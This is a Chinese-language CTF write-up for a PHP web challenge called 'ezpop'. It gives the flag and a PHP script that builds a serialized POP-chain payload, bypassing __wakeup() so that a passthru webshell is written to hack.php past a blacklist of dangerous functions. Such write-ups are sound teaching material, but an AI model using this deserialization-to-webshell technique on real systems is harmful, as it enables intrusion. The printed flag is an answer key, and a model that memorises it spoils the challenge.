- **题目名称：** ezpop
- **题目类型：** WEB
- **题目难度：** 中等 
- **出题人：** ABU
- **考点：**

1. 反序列化__wakeup()绕过
2. php抽象类反序列化
3. 命令执行绕过

- **描述：** 听说你是pop大师！

- **flag：** flag{Y0u_Ar3_A_POP_Ma5ter!!!!}

- **Writeup：** 

  php抽象类不能被直接实例化，但其子类可以实例化，并可以通过子类来调用父类方法，并且子类必须实现父类的抽象方法，所以可以通过实例化evil来调用到父类的action方法，进入shell方法，此方法为抽象方法，在子类里实现，所以便进入evil的shell方法，用passthru函数绕过函数过滤，用sort读取flag。（当然要先绕过__wakeup()

```php
<?php
class openfunc{
    protected $object;
    function __construct(){
        $this->object=new evil();
    }
    function __wakeup(){
        $this->object=new normal();
    }
    function __destruct(){
        $this->object->action();
    }
}
abstract class hack {

    abstract protected function shell();

    public function action() {
        $this->shell();
    }
}
class normal{
    function action(){
        echo "you must bypass it";
    }
}
class evil extends hack {
    protected $data;
    function __construct(){
        $this->data='<?=passthru("sort /fffffl?ggggg");?>';
    }
    protected function shell(){
        $hack=fopen("hack.php","w") or die("Unable 2 open");
        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/i',$this->data)){
            die("you die");
           }
        fwrite($hack,$this->data);
        fclose($hack);
    }
}
$a=serialize(new Openfunc());
echo $a;
echo urlencode($a);
?>
```

